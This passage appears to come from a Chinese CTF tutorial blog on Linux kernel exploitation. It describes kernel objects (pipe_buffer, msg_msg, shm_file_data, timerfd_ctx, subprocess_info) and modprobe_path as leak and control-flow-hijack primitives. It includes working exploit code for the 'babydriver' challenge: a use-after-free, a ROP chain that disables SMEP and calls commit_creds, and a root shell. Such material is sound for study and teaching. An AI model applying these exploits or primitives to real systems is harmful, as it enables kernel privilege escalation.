class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        write(fd2,target_buf,<span class="number">0x60</span>+<span class="number">0x50</span>);            <span class="comment">// 子线程改struct subprocee_info中的cleanup函数指针（subprocess_info结构体不能覆盖前几个成员，此write有彩蛋）</span></span><br><span class="line">        <span class="keyword">if</span>(race_flag)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;child: detect race happen\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);		</span><br><span class="line"></span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x60</span>);				</span><br><span class="line">	close(fd1);									</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> th1;</span><br><span class="line">    pthread_create(&amp;th1,<span class="literal">NULL</span>,race,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        usleep(<span class="number">1</span>);</span><br><span class="line">        socket(<span class="number">22</span>,AF_INET,<span class="number">0</span>);                   <span class="comment">// 父线程触发malloc struct subprocess_info</span></span><br><span class="line">        <span class="keyword">if</span>(race_flag)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;parent: detect race happen\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	close(fd2);		</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


<p>同利用方法的题：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264563" >SCTF flying_kernel 出题总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ljp-tw.github.io/blog/ASIS-CTF-shared_house/#" >2020 ASIS Shared House Write-up</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="pipe-buffer"   >
          <a href="#pipe-buffer" class="heading-link"><i class="fas fa-link"></i></a><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h1>
      
        <h2 id="利用能力-4"   >
          <a href="#利用能力-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用能力-4" class="headerlink" title="利用能力"></a>利用能力</h2>
      
        <h3 id="控制流劫持-3"   >
          <a href="#控制流劫持-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持-3" class="headerlink" title="控制流劫持"></a>控制流劫持</h3>
      <p>用户态执行<code>pipe(pipe_fd)</code>后，内核态调用过程如下图所示</p>
<p><img   src="image-20230102234711716.png?size=600" style="width: 600px;"  alt="image-20230102234711716"></p>
<p>虽然 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/fs/pipe.c#L610" >alloc_pipe_info() </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>函数中为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/pipe_fs_i.h#L4" >PIPE_DEF_BUFFERS</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 个 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/pipe_fs_i.h#L20" >struct pipe_buffer</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 申请的空间大小为0x280个字节，但内核实际会为它分配0x400即1k字节大小的堆块。</p>
<p><img   src="image-20230102235352192.png?size=600" style="width: 600px;"  alt="image-20230102235352192"></p>
<p>pipe管道创建成功后，用户态将获得两个文件描述符fd[2]，其中fd[0]为从管道读，fd[1]为向管道写。当用户态对管道进行write操作后，调用 <code>close()</code> 关闭文件描述符时，将会触发<code>pipe_buffer</code>中的<code>ops-&gt;release</code>函数。</p>
<p>如果在write之后，调用close之前，利用漏洞将pipe_buffer-&gt;ops改成伪造的函数表地址，就能执行假ops中的假release函数，即实现控制流劫持。（write非必要条件，经过调试发现，即使不调用write，直接调用close函数也能达到控制流劫持的效果）</p>

        <h3 id="信息泄露-3"   >
          <a href="#信息泄露-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息泄露-3" class="headerlink" title="信息泄露"></a>信息泄露</h3>
      <p>pipe_buffer结构体中<code>*ops</code>指向代码段的函数表 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/fs/pipe.c#L218" >anon_pipe_buf_ops</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，通过它可以泄露内核基址。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>



        <h2 id="babydriver利用示例-4"   >
          <a href="#babydriver利用示例-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#babydriver利用示例-4" class="headerlink" title="babydriver利用示例"></a>babydriver利用示例</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="comment">// gcc test.c --static -masm=intel -lpthread -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_pipe_ops[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">size_t</span> fake_pipe_buffer[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> pkc_addr = <span class="number">0xffffffff81070260</span>;</span><br><span class="line"><span class="keyword">size_t</span> cc_addr = <span class="number">0xffffffff8106fed0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = pkc_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = cc_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> mov_rsp_rax = <span class="number">0xffffffff818855cf</span>;    <span class="comment">// mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b</span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rsp_ret = <span class="number">0xffffffff81010fd7</span>;     <span class="comment">// pop rsp ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop_chain[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff8101c216</span>;        <span class="comment">// pop rax; ret;</span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff8100f034</span>;        <span class="comment">// mov cr4,rax; pop rbp; ret </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0x0</span>;</span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81885588</span>;        <span class="comment">// swapgs; ret </span></span><br><span class="line">    rop_chain[index++] = <span class="number">0xffffffff81884177</span>;        <span class="comment">// iretq; </span></span><br><span class="line">    rop_chain[index++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop_chain[index++] = user_cs;</span><br><span class="line">    rop_chain[index++] = user_rflags;</span><br><span class="line">    rop_chain[index++] = user_sp;</span><br><span class="line">    rop_chain[index++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_pipe_buffer[<span class="number">0</span>] = <span class="number">0x01010101</span>;</span><br><span class="line">    fake_pipe_buffer[<span class="number">1</span>] = <span class="number">0x02020202</span>;</span><br><span class="line">    fake_pipe_buffer[<span class="number">2</span>] = fake_pipe_ops;</span><br><span class="line">    fake_pipe_buffer[<span class="number">3</span>] = <span class="number">0x03030303</span>;</span><br><span class="line"></span><br><span class="line">    fake_pipe_ops[<span class="number">0</span>] = pop_rsp_ret;          <span class="comment">// pop rsp; ret</span></span><br><span class="line">    fake_pipe_ops[<span class="number">1</span>] = rop_chain;          <span class="comment">// rop_chain</span></span><br><span class="line">    fake_pipe_ops[<span class="number">2</span>] = mov_rsp_rax;          <span class="comment">// control rip - xchg rsp,rax; ret</span></span><br><span class="line">    fake_pipe_ops[<span class="number">3</span>] = <span class="number">0x33333333</span>;</span><br><span class="line">    fake_pipe_ops[<span class="number">4</span>] = <span class="number">0x44444444</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x400</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write(pipe_fd[1],&quot;test_str&quot;,0x8);</span></span><br><span class="line">    write(fd2,fake_pipe_buffer,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


<p>同利用方法的题：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/124887622" >管道pipe在内核漏洞利用中的应用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.ctfiot.com/76392.html" >N1CTF 2022 Praymoon Write Up</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/16281180.html" >条件竞争 &amp;&amp; pipe_buffer + 堆喷射 </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/" >【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/1055446.html" >D3CTF2022 - Pwn - d3kheap 题解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="shm-file-data介绍"   >
          <a href="#shm-file-data介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#shm-file-data介绍" class="headerlink" title="shm_file_data介绍"></a>shm_file_data介绍</h1>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, <span class="number">100</span>, <span class="number">0600</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr == (<span class="keyword">void</span>*)<span class="number">-1</span>) &#123;</span><br><span class="line">  perror(<span class="string">&quot;shmat&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>当用户态执行以上代码时，<code>shmat()</code>函数对应的内核态调用过程如下图所示</p>
<p><img   src="image-20230108001336271.png?size=600" style="width: 600px;"  alt="image-20230108001336271"></p>
<p>内核中调用 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/ipc/shm.c#L1086" >do_shmat()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数，为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/ipc/shm.c#L50" >struct shm_file_data</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 结构体申请一段内存空间（0x20字节大小）。</p>
<p><img   src="image-20230108002655194.png?size=600" style="width: 600px;"  alt="image-20230108002655194"></p>
<p>根据结构体信息，可以总结该结构体的能力：</p>
<ul>
<li>可泄露内核地址信息：<code>ns</code>和<code>vm_ops</code>两个指针均指向内核数据区，因此可能泄露</li>
<li>可泄露堆地址信息：<code>file</code>指针指向堆区域，因此可泄露</li>
<li>不可控制流劫持：虽然<code>vm_ops</code>指向的函数表中有许多函数指针，但当前没找到合适的调用方式</li>
</ul>

        <h1 id="msg-msg介绍"   >
          <a href="#msg-msg介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#msg-msg介绍" class="headerlink" title="msg_msg介绍"></a>msg_msg介绍</h1>
      <blockquote>
<p>创建一个消息队列，并往消息队列中写入数据的过程中，内核态会为“msg_msg结构体+用户数据”申请一段内存空间。</p>
<p>msg_msg的利用场景：通常是利用该结构体的相关特性将堆溢出转换成UAF</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> msqid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgp</span>&#123;</span></span><br><span class="line">  <span class="keyword">long</span> type;</span><br><span class="line">  <span class="keyword">char</span> mtext[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((msqid = msgget(IPC_PRIVATE,IPC_CREAT|<span class="number">0666</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line">  perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgp</span> <span class="title">msgp1</span>;</span></span><br><span class="line">msgp1.type = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(msgp1.mtext,<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaa&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(msgsnd(msqid,&amp;msgp1,<span class="keyword">sizeof</span>(msgp1.mtext),<span class="number">0</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">  perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>当用户态执行以上代码时，<code>msgsnd()</code>函数对应的内核态调用过程如下图所示</p>
<p><img   src="image-20230108170122639.png?size=600" style="width: 600px;"  alt="image-20230108170122639"></p>
<p>内核中调用 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/ipc/msg.c#L609" >do_msgsnd()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数，为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/msg.h#L8" >struct msg_msg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 和用户态传递的<code>msgp1.mtext</code>共同申请一段内存空间（根据<code>mtext</code>大小的不同，从0x31~0x1000字节大小都有可能）。</p>
<p><img   src="image-20230108170731053.png?size=600" style="width: 600px;"  alt="image-20230108170731053"></p>
<p>需要特别注意<code>struct msg_msgseg *next</code>这个指针的用途，<code>msgsnd()</code>函数发送单个消息的最大长度是8192字节（0x2000），在 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/ipc/msgutil.c#L51" >alloc_msg()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数中，根据单个消息的长度，最多会将消息分成三段（kmalloc三次内存）来存储。如下图，<a href="">这篇文章</a>中有详细的代码分析过程，并且总结了几种msg_msg结构体的利用思路。</p>
<p><img   src="image-20230108181608984.png?size=600" style="width: 600px;"  alt="image-20230108181608984"></p>
<p>根据结构体信息，可以总结该结构体的能力：</p>
<ul>
<li>可泄露堆地址信息：next指向下一段消息（堆空间）。另外，<code>struct list_head m_list</code>作为链表头，也存放着堆地址。<code>void *security</code>也指向堆空间，且<code>msgrcv()</code>时这个空间会被free，某下利用场景下会有用。写的时候需注意，前48个字节（msg_msg结构体区域）不可重写。</li>
</ul>
<p>消息队列编程参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/guoping16/article/details/6584024" >消息队列函数(msgget、msgctl、msgsnd、msgrcv)及其范例</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.51cto.com/u_15467009/4869136" >Linux进程间通讯|消息队列</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>类似题目：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269311.htm" >从两道0解题看Linux内核堆上msg_msg对象扩展利用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/panhewu9919/article/details/120820617?spm=1001.2014.3001.5502" >Linux内核中利用msg_msg结构实现任意地址读写</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="timerfd-ctx介绍"   >
          <a href="#timerfd-ctx介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#timerfd-ctx介绍" class="headerlink" title="timerfd_ctx介绍"></a>timerfd_ctx介绍</h1>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">itimerspec</span> <span class="title">timespec</span> =</span> &#123;&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, &#123;<span class="number">100</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> tfd = timerfd_create(CLOCK_REALTIME, <span class="number">0</span>);</span><br><span class="line">timerfd_settime(tfd, <span class="number">0</span>, &amp;timespec, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>
<p>当用户态执行以上代码时，<code>timerfd_create()</code>函数对应的内核态调用过程如下图所示</p>
<p><img   src="image-20230110173245460.png?size=600" style="width: 600px;"  alt="image-20230110173245460"></p>
<p>内核中调用到 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/fs/timerfd.c#L386" >timerfd_create</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 系统调用处理函数，为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/fs/timerfd.c#L29" >struct timerfd_ctx</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 申请一段内存空间（0xf0字节大小，对应kmalloc-256）。</p>
<p><img   src="image-20230110175125429.png?size=600" style="width: 600px;"  alt="image-20230110175125429"></p>
<p>根据结构体信息及调试信息，总结该结构体能力：</p>
<ul>
<li>可泄露内核地址信息：<code>t.tmr.function</code>（在<code>timerfd_ctx</code>中偏移0x28位置）</li>
<li>可泄露堆地址信息：<code>t.tmr.base</code>（在<code>timerfd_ctx</code>中偏移0x30位置），以及偏移0xa8和0xb0处的list_head链表结构</li>
</ul>

        <h1 id="modprobe-path"   >
          <a href="#modprobe-path" class="heading-link"><i class="fas fa-link"></i></a><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h1>
      
        <h2 id="使用方法"   >
          <a href="#使用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2>
      <blockquote>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sam4k.com/like-techniques-modprobe_path/" >LiKE Techniques: modprobe_path</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中详细讲述了<code>modprobe_path</code>的处理过程。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique" >Linux Kernel Exploitation Technique: Overwriting modprobe_path</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 中以一个例题说明了如何利用<code>modprobe_path</code>。</p>
</blockquote>
<p>当用户态调用execve运行一个无法识别格式的二进制程序时，内核会通过 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L69" >call_modprobe()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数执行内核全局变量<code>modprobe_path</code> 指明的程序（<code>/sbin/modprobe</code>），调用过程如下图所示：</p>
<p><img   src="image-20230109000638136.png?size=600" style="width: 600px;"  alt="image-20230109000638136"></p>
<p>可通过如下方式找到modeprobe_path所在的内存地址</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p modprobe_path</span><br><span class="line">$1 &#x3D; &quot;&#x2F;sbin&#x2F;modprobe&quot;, &#39;\000&#39; &lt;repeats 241 times&gt;</span><br><span class="line">gef➤  p &amp;modprobe_path</span><br><span class="line">$2 &#x3D; (char (*)[256]) 0xffffffff81b78680 &lt;modprobe_path&gt;</span><br><span class="line">gef➤  x&#x2F;s 0xffffffff81b78680</span><br><span class="line">0xffffffff81b78680 &lt;modprobe_path&gt;:	&quot;&#x2F;sbin&#x2F;modprobe&quot;</span><br></pre></td></tr></table></div></figure>
